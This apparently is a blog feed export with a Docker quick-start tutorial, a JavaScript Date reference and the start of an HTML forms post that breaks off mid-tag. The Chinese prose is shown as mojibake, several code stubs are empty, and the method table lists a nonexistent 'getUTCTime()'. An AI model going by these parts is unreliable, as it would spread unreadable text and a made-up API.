image</span><br><span class="line">docker run hello-world</span><br><span class="line"></span><br><span class="line"># list Docker images</span><br><span class="line">docker image ls</span><br><span class="line"></span><br><span class="line"># list Docker containers </span><br><span class="line">docker container ls</span><br></pre></td></tr></table></figure><h4 id="5-2-Containers-Build-an-image-and-run-it-as-one-container"><a href="#5-2-Containers-Build-an-image-and-run-it-as-one-container" class="headerlink" title="5.2  Containers(Build an image and run it as one container)"></a>5.2  Containers(Build an image and run it as one container)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># Create an empty directory. Cd into the new directory, create a file call Dockerfile.</span><br><span class="line">mkdir docker-test</span><br><span class="line">cd docker-test</span><br><span class="line">touch Dockerfile</span><br><span class="line">vim Dockerfile</span><br><span class="line"></span><br><span class="line"># copy-and-paste the follow content into the Dockerfile</span><br><span class="line">  # Use an official Python runtime as a parent image</span><br><span class="line">  FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line">  # Set the working directory to /app</span><br><span class="line">  WORKDIR /app</span><br><span class="line"></span><br><span class="line">  # Copy the current directory contents into the container at /app</span><br><span class="line">  ADD . /app</span><br><span class="line"></span><br><span class="line">  # Install any needed packages specified in requirements.txt</span><br><span class="line">  RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line">  # Make port 80 available to the world outside this container</span><br><span class="line">  EXPOSE 80</span><br><span class="line"></span><br><span class="line">  # Define environment variable</span><br><span class="line">  ENV NAME World</span><br><span class="line"></span><br><span class="line">  # Run app.py when the container launches</span><br><span class="line">  CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># create two more files, requirements.txt and app.py.</span><br><span class="line">requirements.txt</span><br><span class="line">  Flask</span><br><span class="line">  Redis</span><br><span class="line"></span><br><span class="line">app.py</span><br><span class="line">  from flask import Flask</span><br><span class="line">  from redis import Redis, RedisError</span><br><span class="line">  import os</span><br><span class="line">  import socket</span><br><span class="line"></span><br><span class="line">  # Connect to Redis</span><br><span class="line">  redis = Redis(host=&quot;redis&quot;, db=0, socket_connect_timeout=2, socket_timeout=2)</span><br><span class="line"></span><br><span class="line">  app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">  @app.route(&quot;/&quot;)</span><br><span class="line">  def hello():</span><br><span class="line">      try:</span><br><span class="line">          visits = redis.incr(&quot;counter&quot;)</span><br><span class="line">      except RedisError:</span><br><span class="line">          visits = &quot;&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;&quot;</span><br><span class="line"></span><br><span class="line">      html = &quot;&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;&quot; \</span><br><span class="line">              &quot;&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;&quot; \</span><br><span class="line">              &quot;&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;&quot;</span><br><span class="line">      return html.format(name=os.getenv(&quot;NAME&quot;, &quot;world&quot;), hostname=socket.gethostname(), visits=visits)</span><br><span class="line"></span><br><span class="line">  if __name__ == &quot;__main__&quot;:</span><br><span class="line">      app.run(host=&apos;0.0.0.0&apos;, port=80)</span><br></pre></td></tr></table></figure><h4 id="5-3-Build-and-run-the-app"><a href="#5-3-Build-and-run-the-app" class="headerlink" title="5.3 Build and run the app"></a>5.3 Build and run the app</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Creates a Docker image</span><br><span class="line">docker build -t friendlyhello .</span><br><span class="line">docker image ls</span><br><span class="line"></span><br><span class="line"># Run the app</span><br><span class="line">docker run -p 4000:80 friendlyhello</span><br><span class="line"></span><br><span class="line"># Run the app in the background, in detached mode:</span><br><span class="line">$ docker run -d -p 4000:80 friendlyhello</span><br><span class="line"></span><br><span class="line">Stop the process with the container id</span><br><span class="line">$ docker container stop 1fa4ab2cf395</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># visit the URL </span><br><span class="line">http://localhost:4000</span><br></pre></td></tr></table></figure><h4 id="5-4-Share-your-image"><a href="#5-4-Share-your-image" class="headerlink" title="5.4 Share your image"></a>5.4 Share your image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Share your image</span><br><span class="line"># login in with your docker ID</span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"># Tag the image</span><br><span class="line">docker tag image username/repository:tag</span><br><span class="line">docker tag friendlyhello ufresh/get-started:part2</span><br><span class="line"></span><br><span class="line"># Publish the image</span><br><span class="line">docker push username/repository:tag</span><br><span class="line"></span><br><span class="line"># Pull and run the image from the remote repository</span><br><span class="line">docker run -p 4000:80 username/repository:tag</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Date</title>
      <link href="/2018/05/06/Date/"/>
      <url>/2018/05/06/Date/</url>
      <content type="html"><![CDATA[<h3 id="1-Dateå¯¹è±¡"><a href="#1-Dateå¯¹è±¡" class="headerlink" title="1. Dateå¯¹è±¡"></a>1. Dateå¯¹è±¡</h3><p><code>Date()</code>æ„é€ å‡½æ•°æœ‰å››ç§åŸºæœ¬å½¢å¼</p><ul><li><p><strong>æ²¡æœ‰å‚æ•°</strong> : å¦‚æœæ²¡æœ‰è¾“å…¥ä»»ä½•å‚æ•°ï¼ŒDateæ„é€ å™¨ä¼šä¾æ®ç³»ç»Ÿè®¾ç½®çš„å½“å‰æ—¶é—´æ¥åˆ›å»ºä¸€ä¸ªDateå¯¹è±¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>()</span><br></pre></td></tr></table></figure></li><li><p><strong>Unixæ—¶é—´æˆ³</strong> : ä¸€ä¸ªæ•´æ•°å€¼ï¼Œè¡¨ç¤ºè‡ª1970å¹´1æœˆ1æ—¥ 00:00:00 UTCä»¥æ¥çš„æ¯«ç§’æ•°ã€‚æ³¨æ„æ—¶é—´æˆ³ä»…ç²¾ç¡®åˆ°ç§’ã€‚å¦‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(value)</span><br></pre></td></tr></table></figure></li><li><p><strong>æ—¶é—´æˆ³å­—ç¬¦ä¸²</strong> : è¡¨ç¤ºæ—¥æœŸçš„å­—ç¬¦ä¸²å€¼ã€‚å¦‚æœè¦ç”¨æ—¥æœŸå­—ç¬¦ä¸²å‚æ•°ï¼Œåˆ™éœ€è¦ç”¨å…¨çƒéƒ½èƒ½æ¥å—çš„æ ¼å¼ï¼Œå…¶ä¸­ä¸€ç§æ ¼å¼æ˜¯ISO 8601æ‰©å±•æ ¼å¼ï¼Œå…¶ä¸­å°æ—¶ã€åˆ†é’Ÿã€ç§’ã€æ¯«ç§’éƒ½æ˜¯å¯é€‰çš„ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ISO 8601 Extended format</span></span><br><span class="line"><span class="comment">  YYYYï¼š4ä½æ•°å¹´ä»½</span></span><br><span class="line"><span class="comment">  MMï¼šä¸¤ä½æ•°æœˆä»½(å³ 1æœˆä¸º01,12æœˆä¸º12)</span></span><br><span class="line"><span class="comment">  DDï¼šä¸¤ä½æ•°çš„æ—¥æœŸ(0åˆ°31)</span></span><br><span class="line"><span class="comment">  -ï¼šæ—¥æœŸåˆ†éš”ç¬¦</span></span><br><span class="line"><span class="comment">  Tï¼šè¡¨ç¤ºå¼€å§‹æ—¶é—´</span></span><br><span class="line"><span class="comment">  HHï¼š24ä½å°æ—¶æ•°ï¼ˆ0åˆ°23ï¼‰</span></span><br><span class="line"><span class="comment">  mmï¼šåˆ†é’Ÿï¼ˆ0åˆ°59ï¼‰</span></span><br><span class="line"><span class="comment">  ssï¼šç§’ï¼ˆ0åˆ°59ï¼‰</span></span><br><span class="line"><span class="comment">  sssï¼šæ¯«ç§’ï¼ˆ0åˆ°999ï¼‰</span></span><br><span class="line"><span class="comment">  :ï¼šæ—¶é—´åˆ†éš”ç¬¦</span></span><br><span class="line"><span class="comment">  Zï¼šå¦‚æœå­˜åœ¨Zï¼Œåˆ™æ—¥æœŸå°†è®¾ç½®ä¸ºUTCï¼Œå¦‚æœZä¸å­˜åœ¨ï¼Œåˆ™ä¸ºæœ¬åœ°æ—¶é—´ã€‚</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">`YYYY-MM-DDTHH:mm:ss:sssZ`</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ†åˆ«æä¾›æ—¥æœŸæ—¶é—´çš„æ¯ä¸€ä¸ªæˆå‘˜</strong><br>æ³¨æ„ï¼šå¦‚æœæ•°å€¼å¤§äºåˆç†èŒƒå›´æ—¶ï¼ˆå¦‚monthIndex = 13, minutes = 70ï¼‰ï¼Œç›¸é‚»çš„æ•°å€¼ä¼šè¢«è°ƒæ•´</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(year, monthIndex, day, hours, minutes, seconds, milliseconds)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">13</span>, <span class="number">1</span>) </span><br><span class="line"><span class="comment">// ç›¸å½“äº new Date(2014, 1, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2013</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">70</span>)</span><br><span class="line"><span class="comment">// ç›¸å½“äº new Date(2013, 2, 1, 1, 10)</span></span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>å‚æ•°</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td>year</td><td style="text-align:center">è¡¨ç¤ºå¹´ä»½çš„æ•´æ•°å€¼ï¼Œ0-99ä¼šè¢«æ˜ å°„è‡³1900-1999å¹´ï¼Œå…¶ä»–å€¼ä»£è¡¨å®é™…å¹´ä»½</td></tr><tr><td>monthIndex</td><td style="text-align:center">è¡¨ç¤ºæœˆä»½çš„æ•´æ•°å€¼ï¼Œä»0ï¼ˆ 1æœˆ ï¼‰åˆ°11ï¼ˆ 12æœˆ ï¼‰</td></tr><tr><td>day</td><td style="text-align:center">å¯é€‰ï¼Œè¡¨ç¤ºä¸€ä¸ªæœˆä¸­çš„ç¬¬å‡ å¤©çš„æ•´æ•°å€¼ï¼Œä»1å¼€å§‹ã€‚é»˜è®¤å€¼ä¸º1</td></tr><tr><td>hours</td><td style="text-align:center">å¯é€‰ï¼Œè¡¨ç¤ºå°æ—¶çš„æ•´æ•°å€¼ï¼ˆ24å°æ—¶åˆ¶ï¼‰ã€‚é»˜è®¤å€¼ä¸º0</td></tr><tr><td>minutes</td><td style="text-align:center">å¯é€‰ï¼Œè¡¨ç¤ºåˆ†é’Ÿçš„æ•´æ•°å€¼ã€‚é»˜è®¤å€¼ä¸º0</td></tr><tr><td>secondes</td><td style="text-align:center">å¯é€‰ï¼Œè¡¨ç¤ºç§’çš„æ•´æ•°å€¼ã€‚é»˜è®¤å€¼ä¸º0</td></tr><tr><td>millseconds</td><td style="text-align:center">å¯é€‰ï¼Œè¡¨ç¤ºæ¯«ç§’çš„æ•´æ•°å€¼ã€‚é»˜è®¤å€¼ä¸º0</td></tr></tbody></table><p><br></p><h3 id="2-æ–¹æ³•"><a href="#2-æ–¹æ³•" class="headerlink" title="2. æ–¹æ³•"></a>2. æ–¹æ³•</h3><p>ç”±äºå­˜åœ¨æ—¶åŒºçš„æ¦‚å¿µï¼ŒJSé‡Œæœ‰ä¸¤ä¸ªæ—¶é—´ï¼šæœ¬åœ°æ—¶é—´å’Œåè°ƒä¸–ç•Œæ—¶(UTCæ—¶é—´)ã€‚</p><ul><li><em>æœ¬åœ°æ—¶é—´</em> æ˜¯æŒ‡ä½ çš„è®¡ç®—æœºæ‰€åœ¨çš„æ—¶åŒº</li><li><em>UTC</em> æ˜¯æ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´(GMT)çš„åŒä¹‰è¯</li></ul><p>JSä¸­çš„æ¯ä¸ªæ—¥æœŸæ–¹æ³•éƒ½æ˜¯æœ¬åœ°æ—¶é—´ï¼Œåªæœ‰æŒ‡å®šUTCï¼Œæ‰èƒ½è·å–UTCæ—¶é—´ã€‚ä¸­å›½å¤„äºä¸œå…«åŒºï¼Œä¸UTCæ—¶é—´ç›¸å·®8å°æ—¶ï¼ŒUTCæ—¶é—´00:00:00çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„æ—¶é—´æ˜¯08:00:00</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-11-11'</span>)</span><br><span class="line"><span class="comment">// Wed Nov 11 2020 08:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>æ–¹æ³•</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td><code>Date.now()</code></td><td style="text-align:center">è¿”å›è‡ª1970-1-1 00:00:00 UTCè‡³ä»Šæ‰€ç»è¿‡çš„æ¯«ç§’æ•°</td></tr><tr><td><code>Date.UTC()</code></td><td style="text-align:center">æ¥å—æ„é€ å‡½æ•°æœ€é•¿å½¢å¼çš„å‚æ•°ç›¸åŒçš„å‚æ•°ï¼Œè¿”å›ä»1970-1-1 00:00:00å¼€å§‹æ‰€ç»è¿‡çš„æ¯«ç§’æ•°</td></tr><tr><td><code>Date.parse()</code></td><td style="text-align:center">è§£æä¸€ä¸ªè¡¨ç¤ºæ—¥æœŸçš„å­—ç¬¦ä¸²ï¼Œè¿”å›ä»1970-1-1 00:00:00æ‰€ç»è¿‡çš„æ¯«ç§’æ•°(ä¸æ¨èä½¿ç”¨)</td></tr><tr><td><em>Getter æœ¬åœ°æ—¶é—´</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.getFullYear()</code></td><td style="text-align:center">è¿”å›å¹´ä»½(å››ä½æ•°å­—)</td></tr><tr><td><code>Date.prototype.getMonth()</code></td><td style="text-align:center">è¿”å›æœˆä»½(0~11)</td></tr><tr><td><code>Date.prototype.getDate()</code></td><td style="text-align:center">è¿”å›æœˆä»½ä¸­çš„ç¬¬å‡ å¤©(1~31)</td></tr><tr><td><code>Date.prototype.getDay()</code></td><td style="text-align:center">è¿”å›æ˜ŸæœŸä¸­çš„ç¬¬å‡ å¤©(0~6)</td></tr><tr><td><code>Date.prototype.getHours()</code></td><td style="text-align:center">è¿”å›å°æ—¶(0~23)</td></tr><tr><td><code>Date.prototype.getMinutes()</code></td><td style="text-align:center">è¿”å›åˆ†é’Ÿ(0~59)</td></tr><tr><td><code>Date.prototype.getSeconds()</code></td><td style="text-align:center">è¿”å›ç§’æ•°(0~59)</td></tr><tr><td><code>Date.prototype.getMilliseconds()</code></td><td style="text-align:center">è¿”å›æ¯«ç§’(0~999)</td></tr><tr><td><code>Date.prototype.getTime()</code></td><td style="text-align:center">è¿”å›ä»1970-1-1 00:00:00æ‰€ç»è¿‡çš„æ¯«ç§’æ•°</td></tr><tr><td><code>Date.prototype.getTimezoneOffset</code></td><td style="text-align:center">è¿”å›å½“å‰æ—¶åŒºçš„æ—¶åŒºåç§»</td></tr><tr><td><em>Setter æœ¬åœ°æ—¶é—´</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.setFullYear()</code></td><td style="text-align:center">è®¾ç½®å¹´ä»½(å››ä½æ•°å­—)</td></tr><tr><td><code>Date.prototype.setMonth()</code></td><td style="text-align:center">è®¾ç½®æœˆä»½(0~11)</td></tr><tr><td><code>Date.prototype.setDate()</code></td><td style="text-align:center">è®¾ç½®æœˆä»½ä¸­çš„ç¬¬å‡ å¤©(1~31)</td></tr><tr><td><code>Date.prototype.setHours()</code></td><td style="text-align:center">è®¾ç½®å°æ—¶(0~23)</td></tr><tr><td><code>Date.prototype.setMinutes()</code></td><td style="text-align:center">è®¾ç½®åˆ†é’Ÿ(0~59)</td></tr><tr><td><code>Date.prototype.setSeconds()</code></td><td style="text-align:center">è®¾ç½®ç§’æ•°(0~59)</td></tr><tr><td><code>Date.prototype.setMilliseconds()</code></td><td style="text-align:center">è®¾ç½®æ¯«ç§’(0~999)</td></tr><tr><td><code>Date.prototype.setTime()</code></td><td style="text-align:center">æŒ‡å®šæ—¶é—´æˆ³æ¥è®¾ç½®æ—¥æœŸå¯¹è±¡çš„æ—¶é—´</td></tr><tr><td><em>Getter ä¸–ç•Œæ—¶é—´</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.getUTCFullYear()</code></td><td style="text-align:center">è¿”å›å¹´ä»½(å››ä½æ•°å­—)</td></tr><tr><td><code>Date.prototype.getUTCMonth()</code></td><td style="text-align:center">è¿”å›æœˆä»½(0~11)</td></tr><tr><td><code>Date.prototype.getUTCDate()</code></td><td style="text-align:center">è¿”å›æœˆä»½ä¸­çš„ç¬¬å‡ å¤©(1~31)</td></tr><tr><td><code>Date.prototype.getUTCDay()</code></td><td style="text-align:center">è¿”å›æ˜ŸæœŸä¸­çš„ç¬¬å‡ å¤©(0~6)</td></tr><tr><td><code>Date.prototype.getUTCHours()</code></td><td style="text-align:center">è¿”å›å°æ—¶(0~23)</td></tr><tr><td><code>Date.prototype.getUTCMinutes()</code></td><td style="text-align:center">è¿”å›åˆ†é’Ÿ(0~59)</td></tr><tr><td><code>Date.prototype.getUTCSeconds()</code></td><td style="text-align:center">è¿”å›ç§’æ•°(0~59)</td></tr><tr><td><code>Date.prototype.getUTCMilliseconds()</code></td><td style="text-align:center">è¿”å›æ¯«ç§’(0~999)</td></tr><tr><td><code>Date.prototype.getUTCTime()</code></td><td style="text-align:center">è¿”å›ä»1970-1-1 00:00:00æ‰€ç»è¿‡çš„æ¯«ç§’æ•°</td></tr><tr><td><em>Setter ä¸–ç•Œæ—¶é—´</em></td><td style="text-align:center"></td></tr><tr><td><code>Date.prototype.setUTCFullYear()</code></td><td style="text-align:center">è®¾ç½®å¹´ä»½(å››ä½æ•°å­—)</td></tr><tr><td><code>Date.prototype.setUTCMonth()</code></td><td style="text-align:center">è®¾ç½®æœˆä»½(0~11)</td></tr><tr><td><code>Date.prototype.setUTCDate()</code></td><td style="text-align:center">è®¾ç½®æœˆä»½ä¸­çš„ç¬¬å‡ å¤©(1~31)</td></tr><tr><td><code>Date.prototype.setUTCHours()</code></td><td style="text-align:center">è®¾ç½®å°æ—¶(0~23)</td></tr><tr><td><code>Date.prototype.setUTCMinutes()</code></td><td style="text-align:center">è®¾ç½®åˆ†é’Ÿ(0~59)</td></tr><tr><td><code>Date.prototype.setUTCSeconds()</code></td><td style="text-align:center">è®¾ç½®ç§’æ•°(0~59)</td></tr><tr><td><code>Date.prototype.setUTCMilliseconds()</code></td><td style="text-align:center">è®¾ç½®æ¯«ç§’(0~999)</td></tr><tr><td><em>Conversion getter</em></td><td style="text-align:center">è¿”å›å€¼</td></tr><tr><td><code>Date.prototype.toDateString()</code></td><td style="text-align:center">Wed May 06 2020</td></tr><tr><td><code>Date.prototype.toISOString()</code></td><td style="text-align:center">2020-05-06T06:17:38.124Z</td></tr><tr><td><code>Date.prototype.toJSON()</code></td><td style="text-align:center">2020-05-06T06:17:38.124Z</td></tr><tr><td><code>Date.prototype.toLocaleDateString()</code></td><td style="text-align:center">2020/5/6</td></tr><tr><td><code>Date.prototype.toLocaleString()</code></td><td style="text-align:center">2020/5/6 ä¸‹åˆ2:17:38</td></tr><tr><td><code>Date.prototype.toLocaleTimeString()</code></td><td style="text-align:center">ä¸‹åˆ2:17:38</td></tr><tr><td><code>Date.prototype.toString()</code></td><td style="text-align:center">Wed May 06 2020 14:17:38 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</td></tr><tr><td><code>Date.prototype.toTimeString()</code></td><td style="text-align:center">14:17:38 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</td></tr><tr><td><code>Date.prototype.toUTCString()</code></td><td style="text-align:center">Wed, 06 May 2020 06:17:38 GMT</td></tr><tr><td><code>Date.prototype.valueOf()</code></td><td style="text-align:center">1588745858124</td></tr></tbody></table><p><br></p><h3 id="3-å¸¸ç”¨æ–¹æ³•"><a href="#3-å¸¸ç”¨æ–¹æ³•" class="headerlink" title="3. å¸¸ç”¨æ–¹æ³•"></a>3. å¸¸ç”¨æ–¹æ³•</h3><ul><li><p>æ ¡éªŒæ—¥æœŸæ ¼å¼</p></li><li><p>æ—¶é—´æˆ³</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line"><span class="keyword">const</span> seconds = <span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŒ‡å®šæ—¥æœŸè½¬æ—¶é—´æˆ³</span></span><br><span class="line"><span class="keyword">const</span> seconds = </span><br><span class="line"></span><br><span class="line"><span class="comment">// æ—¶é—´æˆ³è½¬æ—¥æœŸ</span></span><br></pre></td></tr></table></figure></li><li><p>æ—¶é—´æ ¼å¼åŒ–</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span></span><br></pre></td></tr></table></figure></li><li><p>æ ¹æ®æ—¥æœŸè·å–åŒºé—´</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–æ—¥æœŸæ‰€åœ¨å‘¨åŒºé—´</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ—¥æœŸæ‰€åœ¨æœˆåŒºé—´</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ—¥æœŸæ‰€åœ¨å¹´</span></span><br></pre></td></tr></table></figure></li><li><p>è®¡ç®—æ—¶é—´å·®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> start = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-01-02'</span>)</span><br><span class="line"><span class="keyword">var</span> end = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-01-03'</span>)</span><br><span class="line"><span class="keyword">var</span> elapsed = end.getTime() - start.getTime()</span><br></pre></td></tr></table></figure></li><li><p>æ¯”è¾ƒæ—¥æœŸ</p></li><li><p>ä»ä¸€ä¸ªæ—¥æœŸæ·»åŠ /å‡å»å¢é‡</p></li><li><p>UTCï¼Œæœ¬åœ°æ—¶é—´è½¬æ¢</p></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5d12b308f265da1b7c612746" target="_blank" rel="noopener">éœ€è¦çŸ¥é“çš„JSçš„æ—¥æœŸçš„çŸ¥è¯†ï¼Œéƒ½åœ¨è¿™äº†</a></li><li><a href="https://juejin.im/post/5b9f4df66fb9a05d2e1b8f02#heading-13" target="_blank" rel="noopener">ã€è¯‘ã€‘ä½ å¯èƒ½ä¸éœ€è¦Moment.js</a></li><li><a href="https://github.com/iamkun/dayjs/blob/dev/src/index.js" target="_blank" rel="noopener">https://github.com/iamkun/dayjs/blob/dev/src/index.js</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>è¡¨å•ç»„ä»¶ï¼ŒformDataï¼Œfileå¯¹è±¡</title>
      <link href="/2018/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2018/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<h3 id="1-è¡¨å•ç»„ä»¶"><a href="#1-è¡¨å•ç»„ä»¶" class="headerlink" title="1. è¡¨å•ç»„ä»¶"></a>1. è¡¨å•ç»„ä»¶</h3><p><code>&lt;form&gt;</code>å¯¹åº”çš„æ˜¯HTMLForm-Elementç±»å‹ï¼Œæœ‰å®ƒç‹¬æœ‰çš„å±æ€§å’Œæ–¹æ³•:</p><ul><li>acceptCharset: æœåŠ¡å™¨èƒ½å¤„ç†çš„å­—ç¬¦é›†</li><li>action: æ¥å—è¯·æ±‚çš„URL</li><li>elements: è¡¨å•ä¸­æ‰€æœ‰æ§ä»¶çš„é›†åˆ(HTMLCollectino)</li><li>enctype: è¯·æ±‚çš„ç¼–ç ç±»å‹</li><li>length: è¡¨å•ä¸­æ§ä»¶çš„æ•°é‡</li><li>method: è¦å‘é€çš„HTTPè¯·æ±‚ç±»å‹ï¼Œget/post</li><li>name: è¡¨å•çš„åç§°</li><li>reset(): å°†æ‰€æœ‰è¡¨å•åŸŸé‡ç½®ä¸ºé»˜è®¤å€¼</li><li>submit(): æäº¤è¡¨å•</li><li>target: ç”¨äºå‘é€è¯·æ±‚å’Œæ¥æ”¶å“åº”çš„çª—å£åç§°</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/api"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"25"</span> <span class="attr">maxlength</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"initial value"</span> <span class="attr">autofocus</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"25"</span> <span class="attr">cols</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"color"</span> <span class="attr">value</span>=<span class="string">"red"</span> <span class="attr">readOnly</span> 